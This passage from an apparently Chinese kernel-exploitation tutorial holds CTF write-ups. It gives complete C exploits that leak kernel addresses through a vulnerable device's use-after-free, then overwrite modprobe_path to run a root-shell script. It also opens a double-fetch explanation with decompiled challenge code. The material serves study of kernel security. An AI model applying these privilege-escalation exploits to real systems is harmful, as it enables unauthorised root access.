<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Data</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> *buf;</span><br><span class="line">    <span class="type">u_int32_t</span> offset;</span><br><span class="line">    <span class="type">u_int32_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc_buf</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> Data *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x1111111</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_buf</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> Data *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6666666</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">read_buf</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> Data *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x7777777</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> xkmod_fd[<span class="number">5</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        xkmod_fd[i] = open(<span class="string">&quot;/dev/xkmod&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (xkmod_fd[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] %d Failed to open xkmod.&quot;</span>, i);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Data</span> <span class="title">data</span> =</span> &#123;<span class="built_in">malloc</span>(<span class="number">0x1000</span>), <span class="number">0</span>, <span class="number">0x50</span>&#125;;</span><br><span class="line">    alloc_buf(xkmod_fd[<span class="number">0</span>], &amp;data);</span><br><span class="line">    close(xkmod_fd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    read_buf(xkmod_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    qword_dump(<span class="string">&quot;buf&quot;</span>, data.buf, <span class="number">0x50</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> page_offset_base = data.buf[<span class="number">0</span>] &amp; <span class="number">0xFFFFFFFFF0000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] page_offset_base: %p\n&quot;</span>, page_offset_base);</span><br><span class="line"></span><br><span class="line">    data.buf[<span class="number">0</span>] = page_offset_base + <span class="number">0x9d000</span> - <span class="number">0x10</span>;</span><br><span class="line">    write_buf(xkmod_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    alloc_buf(xkmod_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    alloc_buf(xkmod_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line"></span><br><span class="line">    data.size = <span class="number">0x50</span>;</span><br><span class="line">    read_buf(xkmod_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    qword_dump(<span class="string">&quot;buf&quot;</span>, data.buf, <span class="number">0x50</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">size_t</span> kernel_offset = data.buf[<span class="number">2</span>] - <span class="number">0xffffffff81000030</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line">    modprobe_path += kernel_offset;</span><br><span class="line"></span><br><span class="line">    close(xkmod_fd[<span class="number">1</span>]);</span><br><span class="line">    data.buf[<span class="number">0</span>] = modprobe_path - <span class="number">0x10</span>;</span><br><span class="line">    write_buf(xkmod_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line">    alloc_buf(xkmod_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line">    alloc_buf(xkmod_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *) &amp;data.buf[<span class="number">2</span>], <span class="string">&quot;/home/shell.sh&quot;</span>);</span><br><span class="line">    write_buf(xkmod_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (open(<span class="string">&quot;/home/shell.sh&quot;</span>, O_RDWR) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        system(<span class="string">&quot;echo &#x27;#!/bin/sh&#x27; &gt;&gt; /home/shell.sh&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;echo &#x27;setsid cttyhack setuidgid 0 sh&#x27; &gt;&gt; /home/shell.sh&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;chmod +x /home/shell.sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/home/fake&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="WDB2024-PWN03"><a href="#WDB2024-PWN03" class="headerlink" title="WDB2024 PWN03"></a>WDB2024 PWN03</h2><h3 id="利用思路-26"><a href="#利用思路-26" class="headerlink" title="利用思路"></a>利用思路</h3><p>一道非常简单的内核题，基本上和<code>RWCTF2022 Digging into kernel 1 &amp; 2</code>是一样的，这道题大家拿去练手即可，建议大家自行分析题目，我只把我的<code>exp</code>贴在下面，但是建议大家自己写一个exp。</p>
<h3 id="exp-26"><a href="#exp-26" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> modprobe_path = <span class="number">0xFFFFFFFF81E58B80</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">qword_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] %s:\n&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc_buf</span><span class="params">(<span class="type">int</span> fd, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kmalloc %d\n&quot;</span>, size);</span><br><span class="line">    ioctl(fd, <span class="number">0x0</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">free_buf</span><span class="params">(<span class="type">int</span> fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kfree\n&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">read_buf</span><span class="params">(<span class="type">int</span> fd, <span class="type">size_t</span>* buf, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] copy_to_user %d\n&quot;</span>, size);</span><br><span class="line">    read(fd, buf, size);</span><br><span class="line">    qword_dump(<span class="string">&quot;read_buf&quot;</span>, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_buf</span><span class="params">(<span class="type">int</span> fd, <span class="type">size_t</span>* buf, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] copy_from_user %d\n&quot;</span>, size);</span><br><span class="line">    qword_dump(<span class="string">&quot;write_buf&quot;</span>, buf, size);</span><br><span class="line">    write(fd, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="type">int</span> easy_fd;</span><br><span class="line">    easy_fd = open(<span class="string">&quot;/dev/easy&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    alloc_buf(easy_fd, <span class="number">0xa8</span>);</span><br><span class="line">    free_buf(easy_fd);</span><br><span class="line"></span><br><span class="line">    read_buf(easy_fd, buf, <span class="number">0xa8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> page_offset_base = buf[<span class="number">0</span>] &amp; <span class="number">0xFFFFFFFFF0000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] page_offset_base %p\n&quot;</span>, page_offset_base);</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = page_offset_base + <span class="number">0x9d000</span> - <span class="number">0x10</span>;</span><br><span class="line">    write_buf(easy_fd, buf, <span class="number">0x8</span>);</span><br><span class="line">    </span><br><span class="line">    alloc_buf(easy_fd, <span class="number">0xa8</span>);</span><br><span class="line">    alloc_buf(easy_fd, <span class="number">0xa8</span>);</span><br><span class="line"></span><br><span class="line">    read_buf(easy_fd, buf, <span class="number">0xa8</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">size_t</span> kernel_offset = buf[<span class="number">2</span>] - <span class="number">0xFFFFFFFF81000110</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line">    modprobe_path += kernel_offset;</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = modprobe_path - <span class="number">0x20</span>;</span><br><span class="line">    alloc_buf(easy_fd, <span class="number">0xa8</span>);</span><br><span class="line">    free_buf(easy_fd);</span><br><span class="line"></span><br><span class="line">    write_buf(easy_fd, buf, <span class="number">0x8</span>);</span><br><span class="line">    alloc_buf(easy_fd, <span class="number">0xa8</span>);</span><br><span class="line">    alloc_buf(easy_fd, <span class="number">0xa8</span>);</span><br><span class="line"></span><br><span class="line">    read_buf(easy_fd, buf, <span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *) &amp;buf[<span class="number">4</span>], <span class="string">&quot;/tmp/shell.sh\x00&quot;</span>);</span><br><span class="line">    write_buf(easy_fd, buf, <span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (open(<span class="string">&quot;/tmp/shell.sh&quot;</span>, O_RDWR) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        system(<span class="string">&quot;echo &#x27;#!/bin/sh&#x27; &gt;&gt; /tmp/shell.sh&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;echo &#x27;setsid /bin/cttyhack setuidgid 0 /bin/sh&#x27; &gt;&gt; /tmp/shell.sh&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;chmod +x /shell.sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/tmp/fake&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="内核条件竞争"><a href="#内核条件竞争" class="headerlink" title="内核条件竞争"></a>内核条件竞争</h1><p>通常情况下在用户态下的 pwn 当中我们只有一个独立运行的主线程，并不存在所谓条件竞争的情况，但在 kernel pwn 当中<strong>由攻击者负责编写用户态程序，可以很轻易地启动多个线程同时运行</strong>，从而轻易地产生条件竞争</p>
<h2 id="double-fetch"><a href="#double-fetch" class="headerlink" title="double fetch"></a>double fetch</h2><h3 id="利用思路-27"><a href="#利用思路-27" class="headerlink" title="利用思路"></a>利用思路</h3><p><code>double fetch</code> 直译就是 <code>取值两次</code>，直接理解就是在一次操作当中要<strong>两次（或是多次）重新获取某个对象的值</strong>，可能出现在下面这种情况当中：</p>
<ul>
<li>有一大段数据要从用户空间传给内核空间，但是直接传送整块数据会造成较大的开销，故选择<strong>只向内核传送一个指向用户地址空间的指针</strong></li>
<li>在后续的操作当中内核需要<strong>多次</strong>通过该指针获取到用户空间的数据</li>
</ul>
<p>一个典型的 Double Fetch  漏洞原理如下图所示，一个用户态线程准备数据并通过系统调用进入内核，该数据在内核中有两次被取用，内核第一次取用数据进行安全检查（如缓冲区大小、指针可用性等），当检查通过后内核第二次取用数据进行实际处理。而在两次取用数据之间，另一个用户态线程可创造条件竞争，对已通过检查的用户态数据进行篡改，在真实使用时造成访问越界或缓冲区溢出，最终导致内核崩溃或权限提升。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/pqLSVaINQ3zAsmO.png"
                      alt="pqLSVaINQ3zAsmO"
                ></p>
<p>不难看出，若是整个操作流程过长，则用户进程便有机会修改这一块数据，<strong>使得内核在两次访问这块空间时所获得的数据不一致，从而使得内核进入不同的执行流程</strong>，用户进程甚至可以<strong>直接开新的线程进行竞争来实现这个效果</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/GOSsNPkuMZHlUmT.png"
                      alt="GOSsNPkuMZHlUmT"
                ></p>
<p>通过在 <code>first fetch</code> 与 <code>second fetch</code> 之间的空挡修改数据从而改变内核执行流的利用手法便被称之为<code>double fetch</code>。</p>
<h3 id="0CTF2018-Final-baby-kernel"><a href="#0CTF2018-Final-baby-kernel" class="headerlink" title="0CTF2018 Final baby kernel"></a>0CTF2018 Final baby kernel</h3><h4 id="题目分析-8"><a href="#题目分析-8" class="headerlink" title="题目分析"></a>题目分析</h4><p><strong>start.sh</strong></p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 256M -smp 2,cores=2,threads=1 \</span><br><span class="line">    -kernel ./vmlinuz-4.15.0-22-generic \</span><br><span class="line">    -initrd ./core.cpio \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \</span><br><span class="line">    -cpu qemu64 \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">    -nographic \</span><br><span class="line">    -s</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><strong>逆向分析</strong></p>
<p>其中参数 <code>0x6666</code> 可以获得 flag 在内核中的地址，参数 <code>0x1337</code> 则会将我们传入的 flag 与真正的 flag 进行对比，若正确则会将 flag 打印出来，并且题目没有禁用<code>dmesg</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 __fastcall <span class="title function_">baby_ioctl</span><span class="params">(__int64 a1, attr *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  attr *v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp-5Ch] [rbp-5Ch]</span></span><br><span class="line">  attr *v5; <span class="comment">// [rsp-58h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, a2);</span><br><span class="line">  v5 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x6666</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;Your flag is at %px! But I don&#x27;t think you know it&#x27;s content\n&quot;</span>, flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x1337</span></span><br><span class="line">         &amp;&amp; !_chk_range_not_ok(</span><br><span class="line">               (__int64)v2, </span><br><span class="line">               <span class="number">0x10</span>LL, </span><br><span class="line">               *(_QWORD *)(__readgsqword((<span class="type">unsigned</span> <span class="type">int</span>)&amp;current_task) + <span class="number">0x1358</span>))</span><br><span class="line">         &amp;&amp; !_chk_range_not_ok(</span><br><span class="line">               v5-&gt;flag_str,</span><br><span class="line">               SLODWORD(v5-&gt;flag_len),</span><br><span class="line">               *(_QWORD *)(__readgsqword((<span class="type">unsigned</span> <span class="type">int</span>)&amp;current_task) + <span class="number">0x1358</span>))</span><br><span class="line">         &amp;&amp; LODWORD(v5-&gt;flag_len) == <span class="built_in">strlen</span>(flag) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(flag); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(v5-&gt;flag_str + i) != flag[i] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x16</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">&quot;Looks like the flag is not a secret anymore. So here is it %s\n&quot;</span>, flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xE</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>简单分析可知我们应当传入如下结构体，其中 <code>flag_len</code> 参数与 <code>flag</code> 的长度对比，在 <code>.ko</code> 文件中 <code>flag</code> 的长度为 <code>33</code>。</p>
